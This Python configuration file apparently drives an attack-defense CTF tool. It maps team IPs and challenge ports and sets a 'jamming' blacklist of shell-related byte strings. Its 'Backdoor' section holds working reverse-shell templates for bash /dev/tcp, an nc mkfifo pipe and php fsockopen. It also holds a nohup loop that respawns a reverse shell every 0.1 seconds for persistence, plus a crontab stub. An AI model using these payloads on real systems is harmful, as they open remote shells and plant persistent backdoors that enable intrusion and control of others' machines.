# CTF Info

ip_list =  ['192.168.200.135']
# ip_list =  ['10.0.3.'+str(i) for i in range(14)]

team_list = ['team_'+str(i) for i in range(14)]

port_list = [i for i in range(30000,30010)]
chal_list = ['test_'+str(i) for i in range(10)]

def ip_to_team(ip: str)->str:
    return team_list[ip_list.index(ip)]

def team_to_ip(team: str)->str:
    return ip_list[team_list.index(team)]
    

def port_to_chal(port: int)->str:
    return chal_list[port_list.index(port)]

# Jamming

jamming_length = 2000
jamming_speed = 1000
jamming_time = 8
jamming_blacklist = [b'nc', b'>&', b'/bin/sh', b'flag', b'dev', b'tcp']

# Backdoor
my_ip = "ip"
sh_port = 6770
nc_port = 6771 
php_port = 6772 
# perl_port = 6773
# telnet_port = 6774

sh_rvshell = "sh -i >& /dev/tcp/{ip}/{port} 0>&1"
nc_rvshell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"
php_rvshell = "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"sh <&3 >&3 2>&3\");'"

rvshells = [sh_rvshell,nc_rvshell,php_rvshell]
rv_ports = [sh_port,nc_port,php_port]

nohup_backdoor = "nohup /bin/bash -c \"while true; do {rvshell}; sleep 0.1; done\" > /dev/null 2>&1 &"
crontab_backdoor = "crontab -e\n\n\n"

ip = '1.1.1.1'
port = 22

